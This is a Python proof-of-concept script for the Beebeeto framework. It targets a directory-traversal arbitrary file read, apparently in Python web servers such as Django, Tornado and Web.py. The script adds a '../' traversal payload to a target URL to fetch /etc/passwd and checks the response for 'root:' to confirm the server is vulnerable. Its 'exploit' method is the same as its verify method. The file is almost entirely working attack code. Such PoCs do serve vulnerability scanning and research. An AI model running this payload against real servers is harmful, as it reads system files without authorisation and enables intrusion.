#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0047',
            'name': 'WebServer处理URL不当导致的任意文件读取漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-03-04',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Other',
            'vul_version': ['*'],
            'type': 'Arbitrary File Read',
            'tag': ['Django漏洞', 'Tornado漏洞', 'Web.py漏洞', 'python任意文件读取漏洞'],
            'desc': 'N/A',
            'references': [
                'http://www.lijiejie.com/python-django-directory-traversal/',
                'http://drops.wooyun.org/papers/5040',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = '/../../../../../../../../../etc/passwd'
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: %s' % verify_url
        content = requests.get(verify_url).content
        if 'root:' in content and 'nobody:' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())